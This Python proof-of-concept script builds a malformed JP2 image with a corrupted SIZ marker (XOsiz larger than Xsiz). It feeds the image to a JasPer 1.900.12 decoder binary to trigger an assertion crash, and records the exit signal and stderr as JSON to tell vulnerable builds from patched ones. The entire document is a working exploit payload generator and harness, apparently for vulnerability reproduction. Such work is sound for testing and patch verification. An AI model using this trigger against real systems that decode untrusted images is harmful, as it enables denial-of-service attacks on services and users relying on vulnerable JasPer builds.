#!/usr/bin/env python3
"""Deterministic JasPer 1.900.12 decoder crash PoC.

The script builds a tiny, syntactically valid JP2 image in memory, then
corrupts the JPEG-2000 codestream's SIZ marker so that the image reference
grid has an invalid geometry (Xsiz=32, XOsiz=17).  Vulnerable JasPer builds
fall through to jas_seq2d_create() with a reversed extent and abort on an
assertion.  Patched builds reject the malformed SIZ parameters and return
normally with an error.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

TRUNCATE_BYTES = 8192


def _box(box_type, payload):
    """Return a JP2 box with a known (non-zero) length."""
    return struct.pack(">I", len(payload) + 8) + box_type + payload


def _marker_segment(marker, payload):
    """Return a JPEG-2000 marker segment (marker + Lmark + payload)."""
    return b"\xff" + marker + struct.pack(">H", len(payload) + 2) + payload


def build_trigger_payload():
    """Build the JP2 trigger entirely in memory.

    The base image is a 16x16, 8-bit grayscale JP2.  Its codestream SIZ
    marker is then modified so that XOsiz is greater than Xsiz, which makes
    the decoded component extent invalid.
    """

    # ---- Build a valid 16x16 grayscale JP2 seed. ----
    signature = b"\x00\x00\x00\x0cjP  \r\n\x87\n"

    ftyp = _box(
        b"ftyp",
        b"jp2 \x00\x00\x00\x00jp2 ",
    )

    ihdr = _box(
        b"ihdr",
        struct.pack(
            ">IIHBBBB",
            16,  # height
            16,  # width
            1,   # components
            7,   # bits per component
            7,   # compression type (JPEG-2000)
            0,   # colourspace unknown
            0,   # no intellectual property box
        ),
    )

    colr = _box(
        b"colr",
        struct.pack(">BBBI", 1, 0, 0, 17),  # enumerated sRGB
    )

    jp2h = _box(b"jp2h", ihdr + colr)

    # Codestream: SOC, SIZ, COM, COD, QCD, SOT, QCC, SOD, data, EOC.
    siz_payload = struct.pack(
        ">HIIIIIIIIH",
        0,    # Rsiz
        16,   # Xsiz
        16,   # Ysiz
        0,    # XOsiz
        0,    # YOsiz
        16,   # XTsiz
        16,   # YTsiz
        0,    # XTOsiz
        0,    # YTOsiz
        1,    # Csiz (one component)
    ) + bytes([7, 1, 1])  # Ssiz=8-bit unsigned, XRsiz=1, YRsiz=1

    com_payload = struct.pack(">H", 1) + b"Creator: JasPer Version 1.900.12"

    cod_payload = bytes([
        0,    # coding style
        0,    # progression order
        0, 1, # number of layers
        0,    # multiple component transform
        5,    # decomposition levels
        4,    # code-block width exponent
        4,    # code-block height exponent
        0,    # code-block style
        1,    # reversible transform
    ])

    qcd_payload = bytes.fromhex("4040484850484850484850484850484850")
    sot_payload = struct.pack(">HIBB", 0, 42, 0, 1)
    qcc_payload = bytes.fromhex("004040000000484850484850484850484850")

    codestream = (
        b"\xff\x4f"  # SOC
        + _marker_segment(b"\x51", siz_payload)
        + _marker_segment(b"\x64", com_payload)
        + _marker_segment(b"\x52", cod_payload)
        + _marker_segment(b"\x5c", qcd_payload)
        + _marker_segment(b"\x90", sot_payload)
        + _marker_segment(b"\x5d", qcc_payload)
        + b"\xff\x93"                # SOD
        + bytes([0x80]) * 6
        + b"\xff\xd9"                # EOC
    )

    # JP2 codestream box has length zero because it extends to EOF.
    jp2 = (
        signature
        + ftyp
        + jp2h
        + struct.pack(">I", 0)
        + b"jp2c"
        + codestream
    )

    # Corrupt the SIZ marker geometry in-place.
    payload = bytearray(jp2)
    siz_marker = payload.find(b"\xff\x51")
    if siz_marker < 0:
        raise RuntimeError("internal error: SIZ marker not found")
    # Xsiz follows Rsiz in the SIZ parameter block.
    struct.pack_into(">I", payload, siz_marker + 6, 32)
    # XOsiz now exceeds Xsiz.
    struct.pack_into(">I", payload, siz_marker + 14, 17)
    return bytes(payload)


def _signal_name(returncode):
    if returncode < 0:
        signum = -returncode
        try:
            return signal.Signals(signum).name
        except ValueError:
            return f"SIGNAL_{signum}"
    return None


def _truncate_to_str(data):
    data = data or b""
    return data[:TRUNCATE_BYTES].decode("utf-8", errors="replace")


def run_trigger(binary, timeout):
    """Run the target with an in-memory JP2 trigger and collect evidence."""
    with tempfile.TemporaryDirectory(prefix="jasper-poc-") as temp_dir:
        input_path = os.path.join(temp_dir, "trigger.jp2")
        output_path = os.path.join(temp_dir, "out.pnm")

        with open(input_path, "wb") as handle:
            handle.write(build_trigger_payload())

        command = [
            binary,
            "--input",
            input_path,
            "--output",
            output_path,
            "--output-format",
            "pnm",
        ]

        started = time.perf_counter()
        timed_out = False
        process_error = None
        stdout = b""
        stderr = b""
        returncode = -1

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
            )
            try:
                stdout, stderr = process.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                timed_out = True
                try:
                    os.killpg(process.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                try:
                    process.kill()
                except ProcessLookupError:
                    pass
                stdout, stderr = process.communicate(timeout=5)
            returncode = process.returncode if process.returncode is not None else -1
        except OSError as exc:
            process_error = str(exc)

        runtime_ms = int((time.perf_counter() - started) * 1000)
        stdout_text = _truncate_to_str(stdout)
        stderr_text = _truncate_to_str(stderr)

        signal_name = _signal_name(returncode)

        if process_error:
            kind = "custom"
            observable_value = process_error
            observable_path = None
        elif timed_out:
            kind = "stderr"
            observable_value = stderr_text or "timed out"
            observable_path = None
        elif returncode < 0:
            kind = "crash_trace"
            observable_value = stderr_text
            observable_path = None
        else:
            kind = "combined_output"
            observable_value = (stderr_text or stdout_text).strip()
            observable_path = None

        result = {
            "binary": binary,
            "command": command,
            "returncode": returncode,
            "signal": signal_name,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout_text,
            "stderr": stderr_text,
            "observable": {
                "kind": kind,
                "value": observable_value,
                "path": observable_path,
            },
            "error": process_error,
        }
        return result


def main(argv=None):
    parser = argparse.ArgumentParser(description="JasPer JP2 decoder crash PoC")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument(
        "--json-out",
        default=None,
        help="write JSON result to this path instead of stdout",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=15.0,
        help="per-run timeout in seconds (default: 15)",
    )
    args = parser.parse_args(argv)

    result = run_trigger(args.binary, args.timeout)
    serialized = json.dumps(result, indent=2, sort_keys=True)

    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(serialized + "\n")
    else:
        print(serialized)


if __name__ == "__main__":
    main(sys.argv[1:])
